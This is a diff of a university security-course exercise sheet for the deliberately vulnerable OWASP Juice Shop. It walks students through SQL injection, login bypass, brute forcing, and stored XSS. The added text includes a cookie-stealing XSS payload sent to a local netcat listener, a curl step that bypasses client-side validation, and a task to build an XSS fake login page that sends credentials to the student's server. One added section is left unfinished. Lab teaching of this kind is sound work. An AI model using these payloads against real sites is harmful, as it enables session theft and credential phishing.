@@ -68,10 +68,15 @@ https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
 
 
 ## Prerequisities
+
+
 If you are using the virtual machine provided to you by the course staff,
 then everything should be already installed to your machine. 
 
 Below are the steps to set it up on your own system, in case you want to use your own computer, or your are otherwise unable to aquire provided virtual machine.
+
+<details>
+
 ### Task 1
 
 Get [Docker](https://www.docker.com/) instance for Juice Shop
@@ -106,8 +111,12 @@ Install Wireshark and nmap. Method depends on your operating system.
 For the security experiment you can use Burp, Zapp or any other tool you wish.
 
 ---
+
+</details>
+
 Grading
 ---
+<details>
 You are elgible to following grades in this exercise by doing tasks as defined. Great ideas and implementations could compensate some poorly implemented ones.
 Upper grade requires that all previous ones have been done as well.
 
@@ -121,7 +130,7 @@ Task| Grade/Level | Description
 4|5| Network traffic analysis and a security experiment
 
 Grade 1 can be aquired by doing lecture questionnaires from the corresponding lecture.
-
+</details>
 ## Particularly in tasks 1 and 2:
 
 ***To be able to complete these tasks,*** you will need to explain *why things are happening*. Each answer, which is giving only pure commands or code is automatically though as incompleted or insufficient.
@@ -146,66 +155,51 @@ Site is hosted at ```localhost:3000```. Access it with your browser. Observe and
 __Note__ In Firefox's devtools, in the "Headers" section of packet information, there is a handy "Edit and Resend" button Which can be used to modify packets.
 
 
-### A) Basic SQL Injections
+### Basic SQL Injections
 
 **Noticing errors**
 
-Search field of the JuiceShop is vulnerable to SQL injections.
-Inject some SQL to the searchfield and cause an __SQL__ error. 
+Search field of the JuiceShop is vulnerable to SQL injection. Server is also set up in such a way that it will return an SQL error message if you cause one. Error is viewable from browsers developertools. Inject some SQL to the searchfield and cause an __SQL__ error. 
 
 __Hint__ Try different SQL symbols like statement terminators, comments, quotation marks. Check the network tab for servers response 
 
-__What command(s) did you use?__
-
- __Explain each command/symbol you used in your SQL command that caused the SQL error?__
+__What command did you use?__
 
 __Why did it cause an error?__
  
 __Paste here the command that the SQL server attempts to execute and replace the part(s) taken from the searchfield with the text "SEARCHRESULT".__ 
 
----
-**A bit more concrete error**
-
-As we previously noticed, we are indeed able to inject some SQL commands to the server. Search field was not properly sanitizied. How about log-in fields?
-If this area is vulnerable, it could be very dangerous, because it might enable unauthroized access.
-
-Somehow we know that Admin user is *the first entry* in the User list.
-Can you log in as Admin with SQL - injection, based on that information? You just [have to bypass the login.](https://www.acunetix.com/websitesecurity/sql-injection/)
-
-__What command(s) did you use?__
-
-__Why it is working/what is happening?__
-
-
----
 **Deleted item?**
 
-Shop has an item that has been deleted and therefore does not show on searches. Deduct how the item is marked as deleted and use SQL injection to make it visible and "buy" it. 
+Shop has an item that has been deleted and therefore does not show on searches. For some reason the shop doesn't just remove the item but instead uses a specific variable to set the item as deleted. Do a SQL-attack that causes all the items to be visible (including deleted one.)
 
-__HINT__ Check the command that the SQL server attempts to execute. *Try making all the products visible, not just the deleted ones.* You can then buy it from the list. Also inspect the traffic that happens when you inspect an item for hints on how the items are marked deleted. 
+__Hint__ Examine the SQL-query that the server returned in the last part. How does this query exclude deleted items? Remove that part of the query using comments. 
 
-__What SQL command did you use?__
+__What variable is used for "deleting" items?__
+
+__How did you make all items visible?__
  
-__How are the items "deleted"?__
-
 
 __Explain shortly the logic behind your attack. Why does it work?__
 
 
 
-### B) Modification of client-side code
+---
+**A bit more concrete error**
 
-**Admin section**
+As we previously noticed, we are indeed able to inject some SQL commands to the server. How about log-in fields?
+If this area is vulnerable, it could be very dangerous, because it might enable unauthroized access.
 
-The Admin account which we previously "unlocked", does not actually have much special priviledges. We can see a bit more information than other users.
+ [Bypass the login](https://www.acunetix.com/websitesecurity/sql-injection/) and log in as the first user in the database.
 
-The panel for making the admin stuff is actually hidden.
+__What command(s) did you use?__
 
-Sometimes JavaScript is showing something that you don't want to. For example this site has an admin page that is not linked from anywhere of the site. That pages endpoint is however visible in the JavaScript. Open the juice-shop-min.js with your browser's dev tools and access it. 
+__Why it is working/what is happening?__
 
-__Hint__ JavaScript's name is visible in the HTML code. There is a pretty print option at the bottom of the page ( "{}" - symbol) Use search to find the administration panels endpoint.
+__What user did you log in as?__
 
-__What is the url to access administration panel? You can find page even, when you are not logged in, but information is not showed. Why this still could be considered as risk?__
+---
+
 
 
 ---
@@ -259,13 +253,7 @@ __What SQL command did you use?__
 __Explain shortly the logic behind your attack. Why and how does it work?__
 
 ---
-**Earning money from the shop**
 
-Put an item to your basket and checkout. Monitor the traffic using your browsers devtools. By modifying the requests it is possible to checkout with negative amount of items. Proceed to do so.
-
-__How did you do it?__
-
----
 **Annoying pop-up**
 
 For next, we attempt some cross-site scripting attacks. Insert the following code snippet to "Order ID" field in "Track Orders" tab and to the search field. This should trigger the xss.
@@ -276,42 +264,57 @@ Attack on the "Order ID" is an [reflected XSS attack](https://www.owasp.org/inde
 
 __What is the difference between these two types of attacks? How can you protect your applications against both types of attacks?__
 
-XSS attacks above a relatively harmless. They only affect you and nobody else. It would be way more harmful if you could get the above used code snippet inside the servers database or otherwise visible to all the users. Basically you would have to create a user or a product which name is the XSS-script. Both of those are possible, however creating a user is easier. 
+XSS attacks above are relatively harmless. They only affect you and nobody else. It would be way more harmful if you could get some more damaging code snippet inside the servers database or otherwise visible to all the users. Basically you would have to create a user or a product which name is the XSS-script. Both of those are possible, however creating a user is easier. 
 
-Create a user whose name is ```<script>alert('ALERT')</script>```. Go to the administration panel logged as any user to check that it worked 
+For this example we are going to use the following code snippet. ```<script>document.write('<img src=http://127.0.0.1:5555?c='+ escape(document.cookie)+ '   >');</script>```. This will make the server to attempt to fetch a image from a server we control and when it fails send back the users cookies. This obviously means we need a server. For this we can utilize netcat. Use command ```nc -l 5555 -v```. This starts a TCP server which listens to port 5555.
 
-__Hint__ Juice Shop validates the input in the client side **but** not in the server side.
+If you attempt to just create a user with the name ```<script>document.write('<img src=http://127.0.0.1:5555?c='+ escape(document.cookie)+ '   >');</script>``` using the sites own create account page it will fail. This is because Juice Shop validates the input in the client side **but** not in the server side. For this reason we are going to use curl to send the user creation packet directly to the api, this way bypassing the sites input validation. In order to do this we need to know what type of packet the api expects.
 
-__*Short explanation on how you did it*__  
+We can find out the type of packet we need in the following way. Create a user with what ever username and password you like. Then check the post packet that is sent when you press the create user button. From this packet you see the location and the packet content that is needed to create an account. Create a json file that is in the same format as in the POST request, change the email field to above mentioned code snippet and send it to the user creation api using curl. Below is and example of the curl request.  
+
+```shell
+curl -d @<your_json_file_name>.json -H "Content-Type: application/json" -X POST <API_url>
+```
+After this go to the administration panel while you have netcat on. Administration panel should not appear normally and the netcat should show your cookie information.
+
+__*Paste a screenshot of the administration panel and netcat when the exploit is active.*__  
 
 ---
 
 ### Brute forcing
 
-Let's try out some basic brute forcing. 
+Now lets do something different and try some basic brute forcing. 
 Do the following:
 * Start [muumitalo](https://github.com/VilleKemp/Muumitalo).  ```git clone https://github.com/VilleKemp/Muumitalo``` follow the instruction on the git page on how to start it. You will be bruteforcing this server
 * Create a wordlist containing mutations of the word "vaapukkamehu". Create mutations where individual letters case changes between upper and lower case. Also make mutations where letter 'a' can be number '4' and letter 'e' can be number '3'. 
 * Brute force the right answer to the question posed by the server using above mentioned wordlist
 You can use any tools you find online. If you want to, you can code your own mutator. Alternatively you can search online for a existing mutator/mutators and use them to create the wordlist. Same thing with the actual attack. You can use programs like [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) to do the actual attack after you have created the wordlist.
+
 #### Returns
+
 * Wordlist
 * Any code you created.
 * Detailed description on how you created the wordlist and how you did the brute force attack.
 
-__Hint__ Internet is full of tools to create wordlists. It is potentially easier to combine multiple tools to create the wordlist. You can use existing tools to do the attack if you don't feel like creating your own script. [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) for example can do the attack easily if you have a list containing all the mutations. Don't try to do the attack using burp community edition. It does not allow you to use files as payloads.
+__Hint__ Internet is full of tools to create wordlists. It is potentially easier to combine multiple tools to create the wordlist. If you plan to create your own check python itertools. You can use existing tools to do the attack if you don't feel like creating your own script. [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) for example can do the attack easily if you have a list containing all the mutations. Don't try to do the attack using burp community edition. It does not allow you to use files as payloads.
 
 ## Task 3
 
 Let's get back to Juice Shop. 
 
-The XSS attack you did in the previous task was mostly just annoying. It could however have been way more malicious. For next, we are actually doing that and modify it to be way more dangerous. Your task is the following:
+The XSS attack you did in the previous task was mostly just annoying. It could however have been way more malicious. For next, we are actually doing that and modify it to be way more dangerous. Lets create a XSS-attack that replaces the Juice Shop administration panel with Juice shops login page. Then when the users inputs their credentials the site sends this information to your own server. So your task is the following:
 
 * **Setup a server.** No need to do anything fancy. Basic python [flask](http://flask.pocoo.org/)/[BaseHttpServer](https://docs.python.org/2/library/basehttpserver.html) that can receive post requests is fine. Server can print or save the information to a file. Anything goes as long as it shows that the data entered the server.  
 * **When the user accesses the Juice Shop's administration panel, the page will look like the Juice Shops login page.** Page should be as similiar as possbile but small differences are fine. For example slightly different size login fields, email field not checking for @ sign etc.
 * **When the user inputs anything to the email and password fields and presses the *Login*-button all the information in the email and password fields are sent to your server.** The way you send/show the information is up to you. You just have to demostrate in the server side that the data has entered and that it is the same as inputted to the email and password fields.
 
 We are actually creating something very phishy, just by using XSS vulneralibity.
+
+## Rewrite
+Lets return to the Juice Shop for a moment. Earlier we did some basic XSS-attacks to demonstrate how they work. Now lets build on that. Lets create a situation where when someone accesses the Juice Shops administration panel they are shown the loging screen. When the user inputs their 
+
+#######
+
 
 ### Returns
 
